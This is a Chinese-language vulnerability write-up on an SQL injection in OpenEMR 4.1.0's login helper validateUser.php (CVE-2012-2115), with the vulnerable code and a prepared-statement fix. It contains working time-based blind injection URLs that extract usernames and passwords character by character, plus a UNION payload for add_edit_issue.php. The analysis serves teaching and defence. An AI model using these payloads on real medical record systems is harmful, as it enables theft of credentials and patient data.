## OpenEMR简介

OpenEMR 是一种免费和开源的医疗实践管理系统（Electronic Health Records，EHR），是 ONC
认证的完整电子健康记录系统，具有完全集成的电子病历，处方书写、医疗帐单和临床决策等功能。它在100多个国家被使用，服务超过2亿病患，被公认为全球最受欢迎开源电子健康记录和医疗实践管理解决方案。

  

OpenEMR
4.1.0及之前版本内的interface/login/validateUser.php存在SQL注入漏洞，可允许远程攻击者通过u参数执行任意SQL命令，以获取数据库敏感信息或劫持用户会话。

## 漏洞细节

validateUser.php如下：

    
    
    <?php
    $ignoreAuth=true;
    include_once("../globals.php");
    include_once("$srcdir/sql.inc");
    $user = $_GET['u'];
    $authDB = sqlQuery("select password,length(password) as passlength from users where username = '$user'");
    $passlength = $authDB['passlength'];
    $pw = $authDB['password'];
    if ($passlength == 32)
    {
        echo "0";
    }
    else if($passlength == 40)
    {
        echo "1";
    }
    ?>

validateUser.php由login.php的jquery
函数进行调用，检查初始登录中用于密码的哈希算法。如果密码的长度为40，则使用sha1；长度为32，则使用md5。其中：

    
    
    $authDB = sqlQuery("select password,length(password) as passlength from users where username = '$user'");

内的'$user'属于可控的输入部分，可以通过 ' 使注入点闭合。

登录界面login.php如图所示：

![1618813764_607d2344161acef1e48b6.png!small?1618813764356](https://image.3001.net/images/20210419/1618813764_607d2344161acef1e48b6.png!small?1618813764356)

  

login.php内相关的密码验证代码段如下：

    
    
    function chk_hash_fn()
    {
        var str = document.forms[0].authUser.value;
        $.ajax({
            url: "validateUser.php?u="+str,
            context: document.body,
            success: function(data){
                if(data == 0)
                {
                    document.forms[0].authPass.value=MD5(document.forms[0].clearPass.value);
                    document.forms[0].authNewPass.value=SHA1(document.forms[0].clearPass.value);
                }
                else
                {
                    document.forms[0].authPass.value=SHA1(document.forms[0].clearPass.value);
                }
                document.forms[0].clearPass.value='';
                document.login_form.submit();
            }
        });
    }
    
     

openEMR数据库的users表部分内容如下：

id

|

username

|

password  
  
---|---|---  
  
1

|

admin

|

pass  
  
2

|

wang

|

1qaz2wsx  
  
测试validateUser.php?u=admin返回1

![1618813779_607d2353eeb98c7ba76a3.png!small?1618813780207](https://image.3001.net/images/20210419/1618813779_607d2353eeb98c7ba76a3.png!small?1618813780207)

尝试使用SELECT IF，通过服务器响应时间判定sql语句是否执行，从而试出username个数。

编写注入语句：

    
    
    http://localhost/openemr/interface/login/validateUser.php?u=%27%2B(SELECT+if((select%20count(username)%20from%20users)=2,sleep(3),1))%2B%27

![](https://image.3001.net/images/20210419/1618813822_607d237ecf910853f8422.gif!small)

如图所示，响应数秒后才生成页面，说明数据库响应了注入的SQL语句，并可判断username个数为2。

同理，可通过该方法枚举判断user,password长度并根据字符对应数据。

## 漏洞概念验证PoC

基本payload：

    
    
    validateUser.php?u='+(SELECT+if((select count(username) from users)=2,sleep(3),1))+'
    
    validateUser.php?u='+(SELECT+if(length((select+group_concat(username,':',password)+from+users+limit+0,1))=1,sleep(3),1))+'
    
    validateUser.php?u='+(SELECT+if(ascii(substr((select+group_concat(username,':',password)+from+users+limit+0,1),1,1))=1,sleep(3),1))+'

编写python脚本以进行时间盲注；另外添加了本地代理以使用burpsuite进行监听。

![](https://image.3001.net/images/20210419/1618814545_607d2651c961de7e6e4ce.jpg!small)  

![](https://image.3001.net/images/20210419/1618814556_607d265cdba72d431d852.jpg!small)![](https://image.3001.net/images/20210419/1618814566_607d2666037e5a8976e8d.jpg!small)  

  

使用repeater模块进行分析，执行语句：

    
    
    SELECT IF((select count(username) from users)=2,sleep(3),1)

耗时6027ms，说明SELECT IF的结果为true，数据库响应了请求并进行等待。从而确定了username个数为2。

![1618813869_607d23ad106dabaea4041.png!small?1618813869420](https://image.3001.net/images/20210419/1618813869_607d23ad106dabaea4041.png!small?1618813869420)

有人可能会提出疑问，明明使用的是sleep(3)，为什么实际上用时为6秒？

这是因为在运行时，

    
    
    $authDB = sqlQuery("select password,length(password) as passlength from users where username = '$user'");

validateUser.php会执行嵌套内层select执行一次sleep(3)后，外层的select语句又会执行一次sleep(3)，因此共花费6秒。此处使用phpMyAdmin进行验证。

![1618813892_607d23c47694ea7db8987.png!small?1618813892729](https://image.3001.net/images/20210419/1618813892_607d23c47694ea7db8987.png!small?1618813892729)

  

单独执行SELECT IF内语句时，查询花费仅为3秒。

![1618813904_607d23d08fca11f2d7ee3.png!small?1618813904880](https://image.3001.net/images/20210419/1618813904_607d23d08fca11f2d7ee3.png!small?1618813904880)

  

脚本部分运行结果：

![1618813911_607d23d7e9269c3948f5f.png!small?1618813912156](https://image.3001.net/images/20210419/1618813911_607d23d7e9269c3948f5f.png!small?1618813912156)

  

继续监听，判断出username,password的长度为92个字符。

  

![1618813921_607d23e1b83d734590142.png!small?1618813922123](https://image.3001.net/images/20210419/1618813921_607d23e1b83d734590142.png!small?1618813922123)

  

burpsuite监听到该数据包的MIME
Type为文本，说明该字符的ascii码与数据库内的字符对应，且“a”的ascii码为97，说明username,password中第一个字符为a。

![1618813940_607d23f4de750c55d1172.png!small?1618813941674](https://image.3001.net/images/20210419/1618813940_607d23f4de750c55d1172.png!small?1618813941674)

![1618813949_607d23fdd794bdc7d3822.png!small?1618813950103](https://image.3001.net/images/20210419/1618813949_607d23fdd794bdc7d3822.png!small?1618813950103)

  

通过repeater模块进行复现，回显部分产生延时，说明成功对应到数据库中字符。

  

![1618813961_607d240961ba63c7340f4.png!small?1618813961749](https://image.3001.net/images/20210419/1618813961_607d240961ba63c7340f4.png!small?1618813961749)

  

![1618813970_607d24122f18badeebe8b.png!small?1618813970425](https://image.3001.net/images/20210419/1618813970_607d24122f18badeebe8b.png!small?1618813970425)

  

  

最终结果：

![1618813980_607d241ce6093c5e89507.png!small?1618813981356](https://image.3001.net/images/20210419/1618813980_607d241ce6093c5e89507.png!small?1618813981356)

  

成功通过SQL注入获取到数据库中username,password内容。

![1618813989_607d2425ef9d51632390b.png!small?1618813990250](https://image.3001.net/images/20210419/1618813989_607d2425ef9d51632390b.png!small?1618813990250)

  

另外，OpenEMR 的add_edit_issue.php也有SQL注入漏洞，攻击者可以使用浏览器来利用此漏洞，本文不再展开。

http://www.example.com/interface/patient_file/summary/add_edit_issue.php?issue=0+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,user(),25,26,27--
![1618814002_607d2432b13d54c960a81.png!small?1618814003007](https://image.3001.net/images/20210419/1618814002_607d2432b13d54c960a81.png!small?1618814003007)

  

## 预防SQL注入的方法

使用预处理语句（参数化查询），例如：

    
    
    $stmt = $pdo->prepare('SELECT * FROM blog_posts WHERE YEAR(created) = ? AND MONTH(created) = ?');if (!$stmt->execute([$_GET['year'], $_GET['month']])) {
        header("Location: /blog/"); exit;
    }
    $posts = $stmt->fetchAll(\PDO::FETCH_ASSOC);

## 总结

SQL注入是一种非常常见的攻击手段，服务端没有对客户端的输入信息做过滤，使得信息被带入了数据库查询，从而暴露了数据库内的信息。未部署好防御工作的服务器，可以轻易地让攻击者获取数据库的后台管理员账号和密码，达到进一步渗透的目的，甚至造成整个数据库被"脱库”等。代码注入也长年保持在OWASP漏洞排名前十。因此建议用户使用一定的防御手段以及更加安全的扩展如MySQLi、PDO
MySQL来防止SQL注入攻击。

## 参考资料

  1. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2115
  2. http://www.securityfocus.com/bid/51247
  3. https://www.securityfocus.com/bid/50289
  4. https://www.exploit-db.com/exploits/49742
  5. http://www.mavitunasecurity.com/sql-injection-vulnerability-in-openemr/
  6. https://www.netsparker.com/blog/web-security/sql-injection-vulnerability/
  7. https://mp.weixin.qq.com/s/MGefIEp69VxMZ2at8UICJA
  8. https://www.freebuf.com/vuls/267017.html

